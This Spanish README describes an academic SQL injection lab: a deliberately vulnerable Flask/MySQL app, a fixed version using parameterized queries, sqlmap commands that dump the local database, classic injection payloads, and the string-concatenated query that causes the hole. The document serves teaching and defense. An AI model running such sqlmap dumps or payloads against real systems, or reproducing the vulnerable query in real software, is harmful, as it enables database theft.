# SQL Injection Demo - Aplicación Vulnerable y Segura

Este repositorio contiene dos versiones de una aplicación web de gestión de usuarios:

- **v1.0-vulnerable**: Aplicación vulnerable a SQL Injection
- **v2.0-secure**: Aplicación con sanitización y consultas parametrizadas

## Tecnologías Utilizadas

- **Backend**: Flask (Python)
- **Base de Datos**: MySQL
- **Containerización**: Docker & Docker Compose
- **Testing**: sqlmap

## Estructura del Proyecto

```
SQLInjectionDemo/
├── v1.0-vulnerable/          # Versión vulnerable
│   ├── app/
│   │   ├── app.py           # Aplicación Flask vulnerable
│   │   ├── requirements.txt
│   │   └── templates/       # Templates HTML
│   ├── db/
│   │   └── init.sql         # Script de inicialización de BD
│   └── docker-compose.yml
├── v2.0-secure/             # Versión segura
│   ├── app/
│   │   ├── app.py           # Aplicación Flask segura
│   │   ├── requirements.txt
│   │   └── templates/       # Templates HTML
│   ├── db/
│   │   └── init.sql         # Script de inicialización de BD
│   └── docker-compose.yml
└── README.md
```

## Instrucciones de Uso

### Versión 1.0 - Vulnerable

1. Navegar a la carpeta v1.0-vulnerable:
```bash
cd v1.0-vulnerable
```

2. Iniciar los contenedores:
```bash
docker-compose up -d
```

3. Acceder a la aplicación:
```
http://localhost:5000
```

4. Detener los contenedores:
```bash
docker-compose down
```

### Versión 2.0 - Segura

1. Navegar a la carpeta v2.0-secure:
```bash
cd v2.0-secure
```

2. Iniciar los contenedores:
```bash
docker-compose up -d
```

3. Acceder a la aplicación:
```
http://localhost:5001
```

4. Detener los contenedores:
```bash
docker-compose down
```

## Ataque con sqlmap

### Instalación de sqlmap

```bash
# Linux/Mac
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
python sqlmap.py --version

# Windows
pip install sqlmap
```

### Ataque a la Versión Vulnerable (v1.0)

1. Asegurarse de que la aplicación v1.0 esté corriendo en http://localhost:5000

2. Enumerar bases de datos:
```bash
sqlmap -u "http://localhost:5000/search?username=test" --dbs --batch
```

3. Enumerar tablas de la base de datos 'userdb':
```bash
sqlmap -u "http://localhost:5000/search?username=test" -D userdb --tables --batch
```

4. Dump completo de la tabla 'users':
```bash
sqlmap -u "http://localhost:5000/search?username=test" -D userdb -T users --dump --batch
```

5. Dump completo de toda la base de datos:
```bash
sqlmap -u "http://localhost:5000/search?username=test" -D userdb --dump-all --batch
```

### Intentar Ataque a la Versión Segura (v2.0)

```bash
sqlmap -u "http://localhost:5001/search?username=test" --dbs --batch
```

Este ataque debería fallar debido a las consultas parametrizadas.

## Vulnerabilidades en v1.0

La versión 1.0 es vulnerable a SQL Injection porque:

1. **Concatenación directa de strings**: Las consultas SQL se construyen concatenando directamente la entrada del usuario
2. **Sin sanitización**: No se valida ni escapa la entrada del usuario
3. **Sin consultas preparadas**: No se utilizan consultas parametrizadas

### Ejemplo de Código Vulnerable:

```python
query = f"SELECT * FROM users WHERE username = '{username}'"
```

### Payloads de Ejemplo:

- `' OR '1'='1` - Bypass de autenticación
- `' UNION SELECT NULL, NULL, NULL--` - Union-based injection
- `admin'--` - Comment-based injection

## Correcciones en v2.0

La versión 2.0 implementa las siguientes medidas de seguridad:

1. **Consultas Parametrizadas**: Uso de placeholders (`%s`) en lugar de concatenación
2. **Sanitización de Entrada**: Validación y escape de caracteres especiales
3. **Prepared Statements**: Las consultas se preparan antes de ejecutarse
4. **Validación de Input**: Se valida el formato y tipo de datos de entrada

### Ejemplo de Código Seguro:

```python
query = "SELECT * FROM users WHERE username = %s"
cursor.execute(query, (username,))
```

## Datos de Prueba

La base de datos incluye los siguientes usuarios de prueba:

| ID | Username | Email | Password |
|----|----------|-------|----------|
| 1 | admin | admin@example.com | admin123 |
| 2 | john_doe | john@example.com | password123 |
| 3 | jane_smith | jane@example.com | mypassword |
| 4 | bob_wilson | bob@example.com | secret456 |
| 5 | alice_brown | alice@example.com | pass789 |

## Advertencia

⚠️ **SOLO PARA FINES EDUCATIVOS**

Esta aplicación vulnerable está diseñada únicamente con fines educativos para demostrar vulnerabilidades de SQL Injection y cómo mitigarlas. **NO** debe ser utilizada en entornos de producción ni para actividades maliciosas.

## Autor

Proyecto desarrollado como parte de una asignación académica sobre seguridad en aplicaciones web.

## Licencia

MIT License - Este proyecto es de código abierto para fines educativos.
